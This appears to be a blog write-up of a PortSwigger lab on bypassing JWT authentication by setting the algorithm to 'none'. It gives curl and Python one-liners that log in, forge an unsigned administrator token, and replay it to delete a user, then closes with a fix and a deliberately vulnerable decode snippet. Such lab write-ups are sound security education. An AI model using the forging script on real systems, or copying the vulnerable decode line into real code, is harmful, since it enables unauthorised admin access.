---
layout: post
title: "PortSwigger: JWT Authentication Bypass via Flawed Signature Verification"
date: 2027-10-20 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, JWT]
tags: [portswigger, jwt, authentication-bypass, access-control, alg-none, cwe-347]
---

A JWT is `header.payload.signature`. The header announces which algorithm signed the token. The JWT spec includes an algorithm literally named `none` — meaning "this token is unsigned." A correctly configured server rejects `none` outright. This lab's server honours it: when the header says `alg:none`, it skips signature verification entirely and trusts the payload. So we don't reuse a broken signature — we *delete* the signature, rewrite the header to `none`, change `sub` to `administrator`, and walk into the admin panel. No key, no secret. This is [CWE-347](https://cwe.mitre.org/data/definitions/347.html), Improper Verification of Cryptographic Signature.

## Overview

After logging in as `wiener:peter`, the app hands us a `session` cookie that is a JWT. Decoding the three dot-separated parts:

```
header  = {"kid":"...","alg":"RS256"}
payload = {"iss":"portswigger","exp":...,"sub":"wiener"}
```

The `sub` (subject) claim is the username the server uses for authorization. The signature is meant to stop us editing it. But because the server obeys the `alg` field in the header, we can simply tell it not to verify.

## Step 1 — Log in and grab the token

```bash
CSRF=$(curl -sk -c cookies.txt https://TARGET/login | grep -o 'name="csrf" value="[^"]*"' | sed 's/.*value="//;s/"//')
curl -sk -b cookies.txt -c cookies.txt https://TARGET/login \
  --data-urlencode "csrf=$CSRF" \
  --data-urlencode "username=wiener" \
  --data-urlencode "password=peter" -o /dev/null -w "%{http_code}\n"
# 302  <- the redirect itself proves the password was correct
```

The `session` cookie in `cookies.txt` is the RS256 JWT.

## Step 2 — Forge an unsigned token

Set the header `alg` to `none`, flip `sub` to `administrator`, and drop the signature — leaving the trailing dot so the token still has three segments (the third is empty):

```bash
python3 -c "import base64,json,sys;h,p,s=sys.argv[1].split('.');hd=json.loads(base64.urlsafe_b64decode(h+'=='));pl=json.loads(base64.urlsafe_b64decode(p+'=='));hd['alg']='none';pl['sub']='administrator';b=lambda o:base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode();print(b(hd)+'.'+b(pl)+'.')" "$JWT"
```

Output looks like `eyJ...In0.eyJ...In0.` — note the empty signature after the final dot.

## Step 3 — Replay as administrator and delete carlos

```bash
curl -sk -b "session=$FORGED" https://TARGET/admin                        # admin panel renders
curl -sk -b "session=$FORGED" "https://TARGET/admin/delete?username=carlos" # 302 → solved
```

The `/admin/delete` request returns 302 and the lab flips to **Solved**.

## Why it worked

The verification path reads the algorithm out of the attacker-controlled header and decides what to do based on it. `alg:none` tells the library "skip the signature check," and it complies. The signature is now optional, so any payload — including `sub: administrator` — is trusted.

This differs from the *unverified signature* variant (where the server never checks the signature at all and you keep the original RS256 header and its now-invalid signature). Here you actively rewrite the header to `none` and remove the signature.

## The fix

- Explicitly reject `alg:none` — never treat an unsigned token as valid.
- Pin an allow-list of accepted algorithms server-side; never honour the algorithm named inside the token.
- Require a non-empty, verified signature against the issuer key before trusting any claim.

```python
# vulnerable: accepts alg:none
payload = jwt.decode(token, key, algorithms=['RS256', 'none'])

# fixed: pin the algorithm, reject none
payload = jwt.decode(token, pubkey, algorithms=['RS256'])
```
